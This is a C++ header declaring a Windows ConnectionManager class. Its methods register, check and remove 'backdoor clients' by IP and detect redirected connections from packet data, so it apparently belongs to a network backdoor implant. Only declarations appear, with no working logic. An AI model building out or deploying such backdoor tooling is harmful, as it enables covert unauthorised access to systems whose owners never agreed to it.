#pragma once

// Needed to disable legacy winsock includes otherwise there
// is a compiler error about redefinitions
#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <map>
#include <string>
#include <vector>

#include <Windows.h>

#include "Connection.h"
#include "Packet.h"
#include "Utilities.h"

class ConnectionManager {

public:
	ConnectionManager();

	void AddBackdoorClient(std::string ip);
	BOOL IsBackdoorClient(Packet* packet);
	BOOL IsRedirectedConnection(Packet* packet);
	void RemoveBackdoorClient(std::string ip);

private:

	enum class ConnectionType {
		CONNECT,
		DISCONNECT,
		ESTABLISHED
	};

	void Add(Connection* connection);
	ConnectionManager::ConnectionType GetConnectionState(Packet *packet);
	Connection* Lookup(Packet* packet);
	void Remove(Connection* connection);

	std::vector<std::string> clients;
	std::map<std::string, Connection*> connections;
};